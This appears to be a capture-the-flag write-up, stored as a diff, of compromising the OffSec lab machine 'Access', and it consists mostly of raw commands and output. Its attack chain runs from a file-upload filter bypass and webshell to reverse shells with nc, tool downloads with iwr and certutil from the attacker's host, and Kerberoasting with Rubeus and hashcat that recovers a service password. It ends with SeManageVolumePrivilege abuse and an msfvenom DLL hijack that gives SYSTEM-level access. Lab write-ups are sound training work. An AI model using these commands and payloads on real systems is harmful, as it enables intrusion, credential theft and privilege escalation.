@@ -1,0 +1,520 @@
+No credentials were provided for this machine
+
+nmap -vvv -T5 -Pn 192.168.192.187 -p- -A -oN nmap.txt
+
+sudo echo "192.168.192.187 access.offsec" | sudo tee -a /etc/hosts
+
+http://access.offsec:80/
+https://access.offsec:443/
+
+<a>Upload Image:</a><input type="file" name="the_file" id="fileToUpload">
+
+https://access.offsec/uploads/
+
+https://access.offsec/Ticket.php
+
+Request
+--------------------------------
+POST /Ticket.php HTTP/1.1
+Host: access.offsec
+Content-Length: 9925
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="141", "Not?A_Brand";v="8"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Origin: https://access.offsec
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAVlWfWR9YZjP67vu
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://access.offsec/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=0, i
+Connection: keep-alive
+
+------WebKitFormBoundaryAVlWfWR9YZjP67vu
+Content-Disposition: form-data; name="your-name"
+
+lepotekil
+------WebKitFormBoundaryAVlWfWR9YZjP67vu
+Content-Disposition: form-data; name="your-email"
+
+lepotekil@lepotekil.git
+------WebKitFormBoundaryAVlWfWR9YZjP67vu
+Content-Disposition: form-data; name="ticket-type"
+
+standard-access
+------WebKitFormBoundaryAVlWfWR9YZjP67vu
+Content-Disposition: form-data; name="the_file"; filename="revshell.php"
+Content-Type: application/x-php
+
+Response
+--------------------------------
+HTTP/1.1 200 OK
+Date: Tue, 21 Oct 2025 14:02:04 GMT
+Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+X-Powered-By: PHP/8.0.7
+Content-Length: 123
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<script type="text/javascript">alert("This file extension is not allowed !!");window.location.href = "index.html";</script>
+
+https://owasp.org/www-chapter-pune/meetups/2023/Jan/File-upload-Vulnerability-Praveen-Sutar.pptx.pdf
+https://owasp.org/www-chapter-pune/meetups/2023/Jan/File-upload-Vulnerability-Praveen-Sutar.pptx.pdf
+https://owasp.org/www-chapter-pune/meetups/2023/Jan/File-upload-Vulnerability-Praveen-Sutar.pptx.pdf
+
+Request
+--------------------------------
+POST /Ticket.php HTTP/1.1
+Host: access.offsec
+Content-Length: 9929
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="141", "Not?A_Brand";v="8"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Origin: https://access.offsec
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary770qpxtx6uVmZz3C
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://access.offsec/index.html
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=0, i
+Connection: keep-alive
+
+------WebKitFormBoundary770qpxtx6uVmZz3C
+Content-Disposition: form-data; name="your-name"
+
+lepotekil
+------WebKitFormBoundary770qpxtx6uVmZz3C
+Content-Disposition: form-data; name="your-email"
+
+lepotekil@lepotekil.git
+------WebKitFormBoundary770qpxtx6uVmZz3C
+Content-Disposition: form-data; name="ticket-type"
+
+standard-access
+------WebKitFormBoundary770qpxtx6uVmZz3C
+Content-Disposition: form-data; name="the_file"; filename="webshell.php...."
+Content-Type: image/avif
+
+Response
+--------------------------------
+HTTP/1.1 200 OK
+Date: Tue, 21 Oct 2025 14:43:15 GMT
+Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+X-Powered-By: PHP/8.0.7
+Content-Length: 128
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<script type="text/javascript">alert("You will shortly recieve payment link mail");window.location.href = "index.html";</script>
+
+https://access.offsec/uploads/webshell.php
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/access]
+└─$ nc -lvnp 5555    
+listening on [any] 5555 ...
+connect to [192.168.45.170] from (UNKNOWN) [192.168.192.187] 49850
+SOCKET: Shell has connected! PID: 4172
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\uploads>whoami
+access\svc_apache
+
+C:\xampp\htdocs\uploads>systeminfo
+
+Host Name:                 SERVER
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Primary Domain Controller
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00429-70000-00000-AA939
+Original Install Date:     5/28/2021, 2:52:51 AM
+System Boot Time:          1/8/2025, 12:36:30 PM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2650 Mhz
+BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume2
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 239 MB
+Virtual Memory: Max Size:  2,666 MB
+Virtual Memory: Available: 668 MB
+Virtual Memory: In Use:    1,998 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    access.offsec
+Logon Server:              N/A
+Hotfix(s):                 13 Hotfix(s) Installed.
+                           [01]: KB5009472
+                           [02]: KB4512577
+                           [03]: KB4535680
+                           [04]: KB4577586
+                           [05]: KB4589208
+                           [06]: KB5003243
+                           [07]: KB5003711
+                           [08]: KB5005112
+                           [09]: KB5011551
+                           [10]: KB5006754
+                           [11]: KB5009642
+                           [12]: KB5011574
+                           [13]: KB5005701
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet0 2
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 192.168.192.187
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+C:\xampp\htdocs\uploads>powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\xampp\htdocs\uploads> iwr http://192.168.45.170:8000/winPEAS.bat -OutFile winPEAS.bat
+PS C:\xampp\htdocs\uploads> .\winPEAS.bat
+
+            ((,.,/((((((((((((((((((((/,  */
+     ,/*,..*(((((((((((((((((((((((((((((((((,
+   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*
+   ((((((((((((((((* *****,,,/########## .(* ,((((((
+   (((((((((((/* ******************/####### .(. ((((((
+   ((((((..******************/@@@@@/***/###### /((((((
+   ,,..**********************@@@@@@@@@@(***,#### ../(((((
+   , ,**********************#@@@@@#@@@@*********##((/ /((((
+   ..(((##########*********/#@@@@@@@@@/*************,,..((((
+   .(((################(/******/@@@@@#****************.. /((
+   .((########################(/************************..*(
+   .((#############################(/********************.,(
+   .((##################################(/***************..(
+   .((######################################(************..(
+   .((######(,.***.,(###################(..***(/*********..(
+   .((######*(#####((##################((######/(********..(
+   .((##################(/**********(################(**...(
+   .(((####################/*******(###################.((((
+   .(((((############################################/  /((
+   ..(((((#########################################(..(((((.
+   ....(((((#####################################( .((((((.
+   ......(((((#################################( .(((((((.
+   (((((((((. ,(############################(../(((((((((.
+       (((((((((/,  ,####################(/..((((((((((.
+             (((((((((/,.  ,*//////*,. ./(((((((((((.
+                (((((((((((((((((((((((((((/
+                       by carlospolop
+....
+
+Perform a Kerberoasting attack to crack the svc_mssql account password.
+
+PS C:\xampp\htdocs\uploads> .\GetUserSPNs.ps1                                                                                                                                                                                               
+                                                                                                                                                                                                                          
+ServicePrincipalName : kadmin/changepw                                                                                                                                                                                                      
+Name                 : krbtgt                                                                                                                                                                                                               
+SAMAccountName       : krbtgt                                                                                                                                                                                                               
+MemberOf             : CN=Denied RODC Password Replication Group,CN=Users,DC=access,DC=offsec                                                                                                                                               
+PasswordLastSet      : 4/8/2022 2:12:57 AM                                                                                                                                                                                                  
+                                                                                                                                                                                                                                            
+ServicePrincipalName : MSSQLSvc/DC.access.offsec                                                                                                                                                                                            
+Name                 : MSSQL                                                                                                                                                                                                                
+SAMAccountName       : svc_mssql                                                                                                                                                                                                            
+MemberOf             :                                                                                                                                                                                                                      
+PasswordLastSet      : 5/21/2022 5:33:45 AM
+
+PS C:\xampp\htdocs\uploads> certutil.exe -f -urlcache -split http://192.168.45.170:8000/Rubeus.exe Rubeus.exe                                                                                                                               
+****  Online  ****                                                                                                                                                                                                                          
+  000000  ...                                                                                                                                                                                                                               
+  043e00                                                                                                                                                                                                                                    
+CertUtil: -URLCache command completed successfully.                                                                                                                                                                                         
+PS C:\xampp\htdocs\uploads> .\Rubeus.exe kerberoast /outfile:kerberoast.hashes                                                                                                                                                              
+                                                                                                                                                                                                                                            
+   ______        _                                                                                                                                                                                                                          
+  (_____ \      | |                                                                                                                                                                                                                         
+   _____) )_   _| |__  _____ _   _  ___                                                                                                                                                                                                     
+  |  __  /| | | |  _ \| ___ | | | |/___)                                                                                                                                                                                                    
+  | |  \ \| |_| | |_) ) ____| |_| |___ |                                                                                                                                                                                                    
+  |_|   |_|____/|____/|_____)____/(___/                                                                                                                                                                                                     
+                                                                                                                                                                                                                                            
+  v1.6.4                                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+[*] Action: Kerberoasting                                                                                                                                                                                                                   
+                                                                                                                                                                                                                                            
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.                                                                                                                                                                           
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.                                                                                                                                                                
+                                                                                                                                                                                                                                            
+[*] Searching the current domain for Kerberoastable users                                                                                                                                                                                   
+                                                                                                                                                                                                                                            
+[*] Total kerberoastable users : 1                                                                                                                                                                                                          
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+[*] SamAccountName         : svc_mssql                                                                                                                                                                                                      
+[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec                                                                                                                                                                          
+[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec                                                                                                                                                                                      
+[*] PwdLastSet             : 5/21/2022 12:33:45 PM                                                                                                                                                                                          
+[*] Supported ETypes       : RC4_HMAC_DEFAULT                                                                                                                                                                                               
+[*] Hash written to C:\xampp\htdocs\uploads\kerberoast.hashes                                                                                                                                                                               
+                                                                                                                                                                                                                                            
+[*] Roasted hashes written to : C:\xampp\htdocs\uploads\kerberoast.hashes                                                                                                                                                                   
+PS C:\xampp\htdocs\uploads> type C:\xampp\htdocs\uploads\kerberoast.hashes                                                                                                                                                                  
+$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$8BD3EC1DECF620311AE2A21265D341E1$B763A42D83FC3915AED956C0BCFC3A766C0166890837509904F9250CBEF6F2FB8922789B3BE628390F31B3B3BBF856196E9B491AA30D54BB97631218A7378D97CA8434A8F474665B42FC0E35DF87A40769172EB854276DD2315479500F23D80CA43004152FCAC872D20FEA2C5E1F0284F3DD542112077607EA207B9BDB7C419B611FF1594316CC1F1E1DF08F97809EF54585834DB0C879664D828153116184D666345EE5C064E0A98DEDD949E2EEC27A8CCFE10FBBEC172C15D917760B7CEFF1CDB189CB4DE9EAE77BD0414706079EC136C9C25A09F61D7844FDA0B03F74B73486169E5949FC855ECC9D6E58C56C7289D8BAC94E1C65240AAF7E77DAB50D417444CCF5E0F0D150F8F1E53528433D9B8EA286227BF7A03A6DA05769E0CE977F431C77B4AFDBCD78569F1FCD1DD0A28E3CE3CE19A0523A9C661DAD3A2914E4A2258CCA15D43B9E68772188B0DE8BFD79892DA6F15B6C848993115F4116DD4E1F23952AF2710AD9CEA052133607AB651EEA1FB84809BA84BCFDEB5A419E98895A74844F6072EC7DD4DC760B105D6871AAE760DB90134BE5212363DB787EFA9653F4B903DF554ADDA24F29811C847E78121C4F10A4E4D4F7BFAF5129CBC0E48FD7083690BD3FD66790A7E47D8239B29E9A2D078876E4ED6334D340E3BBDB3EA48DBBA91403CB85CF8B383C061B531AA4A3B6A6693A88A1175CF8C51B7787E46208CEEB175FDFA6317C6CC0E341A4651D1A9F9E0219BEA1D24A67F5C06BB95385D62F25BECCD9AFCC06D740F1F99A2EAB30D8D27F379A2AF87DD43684F34EFCF1E8CBAA3C68D1A5183D8618DF3E301857B0E8297FE2DC6F1C362CEF1C9F8A3E65D2BBF62931ED82CB4C4C53EC0FC9C6732E694AED4BFF71C88DDD3B9DE6126E0E8849EBF7D6A58AD7D1A4EE4643E26BEF1398E117AF796981A5179368F40AB224BA4C9E8057415AEE08E21956022356B02CB2B9E21987EDE15ABBD82655DDDF9551E7675AC0C047498DDCED5BA35D729F1DD764493DAA5EA3BC82424584B270E085A368B1875940085A2FA0E6B7EA465FD645E3DB62D9662FE757150489989ADD7CB5AEE5D603791622F7C2E3FCA57162C1C3164C5774A08FE51271120C8D1FF421F3A3480EB7FF29C82658136CB6F0520A70C85EB060D89FA9BCA2FCAA3ADBDB739D141CE5FDCF79EFC1C697F2202C20E0ABD0503E16E62356477974BB9E3099178A2AC898A474457EEA45F8C27691E534AE041B28C994FFCC76343646A9EF5C04CE44950F0A47DB5C690DD45924B093D15C6A42A669CD03057DF6170BCE5F45891A3A65CFDEED46A547FC1ABB5174EABD99F4C9B6F61ADAA918B93FE323DEA52914D58C3CE203F8965717C4433A0A6813672A620C7C8E8C698FE2A7DE8F5D0550EFC353D2B3189D0552A7505422B51A752C012A8176F26DAD92E8DCED718705F1EB083049C022FD5FD8A32589DE0774BBDC789F5DD4816937EED6BB2A513DAD0E42C23A3355EB27C9C2D286393D335A09F263E41CBEBFA66A1A0037A0457F678F807C762F159BBF1D85AB438D143A20E01130E72A5F512682BB3E504D2DC7FFC0204007A83179C2A26C24FF7D46A4E0B65B05C7
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/access]
+└─$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt 
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #01: cpu--0x000, 1466/2933 MB (512 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 512 MB (777 MB free)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$8bd3ec1decf620311ae2a21265d341e1$b763a42d83fc3915aed956c0bcfc3a766c0166890837509904f9250cbef6f2fb8922789b3be628390f31b3b3bbf856196e9b491aa30d54bb97631218a7378d97ca8434a8f474665b42fc0e35df87a40769172eb854276dd2315479500f23d80ca43004152fcac872d20fea2c5e1f0284f3dd542112077607ea207b9bdb7c419b611ff1594316cc1f1e1df08f97809ef54585834db0c879664d828153116184d666345ee5c064e0a98dedd949e2eec27a8ccfe10fbbec172c15d917760b7ceff1cdb189cb4de9eae77bd0414706079ec136c9c25a09f61d7844fda0b03f74b73486169e5949fc855ecc9d6e58c56c7289d8bac94e1c65240aaf7e77dab50d417444ccf5e0f0d150f8f1e53528433d9b8ea286227bf7a03a6da05769e0ce977f431c77b4afdbcd78569f1fcd1dd0a28e3ce3ce19a0523a9c661dad3a2914e4a2258cca15d43b9e68772188b0de8bfd79892da6f15b6c848993115f4116dd4e1f23952af2710ad9cea052133607ab651eea1fb84809ba84bcfdeb5a419e98895a74844f6072ec7dd4dc760b105d6871aae760db90134be5212363db787efa9653f4b903df554adda24f29811c847e78121c4f10a4e4d4f7bfaf5129cbc0e48fd7083690bd3fd66790a7e47d8239b29e9a2d078876e4ed6334d340e3bbdb3ea48dbba91403cb85cf8b383c061b531aa4a3b6a6693a88a1175cf8c51b7787e46208ceeb175fdfa6317c6cc0e341a4651d1a9f9e0219bea1d24a67f5c06bb95385d62f25beccd9afcc06d740f1f99a2eab30d8d27f379a2af87dd43684f34efcf1e8cbaa3c68d1a5183d8618df3e301857b0e8297fe2dc6f1c362cef1c9f8a3e65d2bbf62931ed82cb4c4c53ec0fc9c6732e694aed4bff71c88ddd3b9de6126e0e8849ebf7d6a58ad7d1a4ee4643e26bef1398e117af796981a5179368f40ab224ba4c9e8057415aee08e21956022356b02cb2b9e21987ede15abbd82655dddf9551e7675ac0c047498ddced5ba35d729f1dd764493daa5ea3bc82424584b270e085a368b1875940085a2fa0e6b7ea465fd645e3db62d9662fe757150489989add7cb5aee5d603791622f7c2e3fca57162c1c3164c5774a08fe51271120c8d1ff421f3a3480eb7ff29c82658136cb6f0520a70c85eb060d89fa9bca2fcaa3adbdb739d141ce5fdcf79efc1c697f2202c20e0abd0503e16e62356477974bb9e3099178a2ac898a474457eea45f8c27691e534ae041b28c994ffcc76343646a9ef5c04ce44950f0a47db5c690dd45924b093d15c6a42a669cd03057df6170bce5f45891a3a65cfdeed46a547fc1abb5174eabd99f4c9b6f61adaa918b93fe323dea52914d58c3ce203f8965717c4433a0a6813672a620c7c8e8c698fe2a7de8f5d0550efc353d2b3189d0552a7505422b51a752c012a8176f26dad92e8dced718705f1eb083049c022fd5fd8a32589de0774bbdc789f5dd4816937eed6bb2a513dad0e42c23a3355eb27c9c2d286393d335a09f263e41cbebfa66a1a0037a0457f678f807c762f159bbf1d85ab438d143a20e01130e72a5f512682bb3e504d2dc7ffc0204007a83179c2a26c24ff7d46a4e0b65b05c7:trustno1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.ac...5b05c7
+Time.Started.....: Tue Oct 21 11:41:56 2025 (0 secs)
+Time.Estimated...: Tue Oct 21 11:41:56 2025 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:   611.8 kH/s (2.40ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 2048/14344385 (0.01%)
+Rejected.........: 0/2048 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: 123456 -> lovers1
+Hardware.Mon.#01.: Util: 51%
+
+Started: Tue Oct 21 11:41:48 2025
+Stopped: Tue Oct 21 11:41:58 2025
+
+password --> trustno1
+
+PS C:\xampp\htdocs\uploads> iwr http://192.168.45.170:8000/RunasCs.exe -OutFile RunasCs.exe
+PS C:\xampp\htdocs\uploads> .\RunasCs.exe svc_mssql trustno1 powershell.exe -r 192.168.45.170:6666                                                                                                                                          
+[*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.                                                                                       
+                                                                                                                                                                                                                                            
+[+] Running in session 0 with process function CreateProcessWithLogonW()                                                                                                                                                                    
+[+] Using Station\Desktop: Service-0x0-460c0$\Default                                                                                                                                                                                       
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 2108 created in background.
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/access]
+└─$ nc -lvnp 6666
+listening on [any] 6666 ...
+connect to [192.168.45.170] from (UNKNOWN) [192.168.192.187] 50292
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name        SID                                         
+================ ============================================
+access\svc_mssql S-1-5-21-537427935-490066102-1511301751-1104
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes                                        
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Group used for deny only                          
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                    
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                      State   
+============================= ================================ ========
+SeMachineAccountPrivilege     Add workstations to domain       Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
+SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+PS C:\Windows\system32>
+
+PS C:\Users\svc_mssql\Desktop> type local.txt
+type local.txt
+5619de19c8cbee04c1712218d0c66d83
+
+Exploit the SeManageVolumePrivilege to grant full control over the Windows directory.
+
+SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
+SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
+SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
+SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
+
+PS C:\Users\svc_mssql\Desktop> iwr http://192.168.45.170:8000/SeManageVolumeExploit.exe -OutFile SeManageVolumeExploit.exe
+iwr http://192.168.45.170:8000/SeManageVolumeExploit.exe -OutFile SeManageVolumeExploit.exe
+PS C:\Users\svc_mssql\Desktop> .\SeManageVolumeExploit.exe 
+.\SeManageVolumeExploit.exe
+Entries changed: 920
+DONE 
+PS C:\Users\svc_mssql\Desktop> iwr http://192.168.45.170:8000/winPEAS.bat -OutFile winPEAS.bat
+iwr http://192.168.45.170:8000/winPEAS.bat -OutFile winPEAS.bat
+PS C:\Users\svc_mssql\Desktop> .\winPEAS.bat
+.\winPEAS.bat
+
+            ((,.,/((((((((((((((((((((/,  */
+     ,/*,..*(((((((((((((((((((((((((((((((((,                                                                                                                                                                                              
+   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*                                                                                                                                                                                           
+   ((((((((((((((((* *****,,,/########## .(* ,((((((                                                                                                                                                                                        
+   (((((((((((/* ******************/####### .(. ((((((                                                                                                                                                                                      
+   ((((((..******************/@@@@@/***/###### /((((((                                                                                                                                                                                      
+   ,,..**********************@@@@@@@@@@(***,#### ../(((((                                                                                                                                                                                   
+   , ,**********************#@@@@@#@@@@*********##((/ /((((                                                                                                                                                                                 
+   ..(((##########*********/#@@@@@@@@@/*************,,..((((                                                                                                                                                                                
+   .(((################(/******/@@@@@#****************.. /((                                                                                                                                                                                
+   .((########################(/************************..*(                                                                                                                                                                                
+   .((#############################(/********************.,(                                                                                                                                                                                
+   .((##################################(/***************..(                                                                                                                                                                                
+   .((######################################(************..(                                                                                                                                                                                
+   .((######(,.***.,(###################(..***(/*********..(                                                                                                                                                                                
+   .((######*(#####((##################((######/(********..(                                                                                                                                                                                
+   .((##################(/**********(################(**...(                                                                                                                                                                                
+   .(((####################/*******(###################.((((                                                                                                                                                                                
+   .(((((############################################/  /((                                                                                                                                                                                 
+   ..(((((#########################################(..(((((.                                                                                                                                                                                
+   ....(((((#####################################( .((((((.                                                                                                                                                                                 
+   ......(((((#################################( .(((((((.                                                                                                                                                                                  
+   (((((((((. ,(############################(../(((((((((.                                                                                                                                                                                  
+       (((((((((/,  ,####################(/..((((((((((.                                                                                                                                                                                    
+             (((((((((/,.  ,*//////*,. ./(((((((((((.                                                                                                                                                                                       
+                (((((((((((((((((((((((((((/                                                                                                                                                                                                
+                       by carlospolop
+
+i used this docs to get the last proof.txt because i didn't found the related docs about WerTrigger
+
+https://medium.com/@siberfaqih/offsec-proving-grounds-access-a-complete-writeup-walkthrough-12ad7f6bad6f
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/access]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.170 LPORT=7777 -f dll -o tzres.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: tzres.dll
+
+PS C:\Windows\system32\wbem> iwr http://192.168.45.170:8000/tzres.dll -OutFile tzres.dll
+iwr http://192.168.45.170:8000/tzres.dll -OutFile tzres.dll
+PS C:\Windows\system32\wbem> dir tzres.dll
+dir tzres.dll
+
+
+    Directory: C:\Windows\system32\wbem
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       10/22/2025   5:49 AM           9216 tzres.dll                                                             
+
+
+PS C:\Windows\system32\wbem> systeminfo
+systeminfo
+ERROR: The remote procedure call failed.
+PS C:\Windows\system32\wbem> 
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/access]
+└─$ nc -lvnp 7777               
+listening on [any] 7777 ...
+connect to [192.168.45.170] from (UNKNOWN) [192.168.192.187] 56507
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\network service
+
+C:\Windows\system32>cd C:\Users\Administrator\Desktop
+cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5C30-DCD7
+
+ Directory of C:\Users\Administrator\Desktop
+
+04/08/2022  02:40 AM    <DIR>          .
+04/08/2022  02:40 AM    <DIR>          ..
+10/21/2025  07:39 AM                34 proof.txt
+               1 File(s)             34 bytes
+               2 Dir(s)  14,818,385,920 bytes free
+
+C:\Users\Administrator\Desktop>type proof.txt
+type proof.txt
+21743c5db788953190271b5b334d93f8
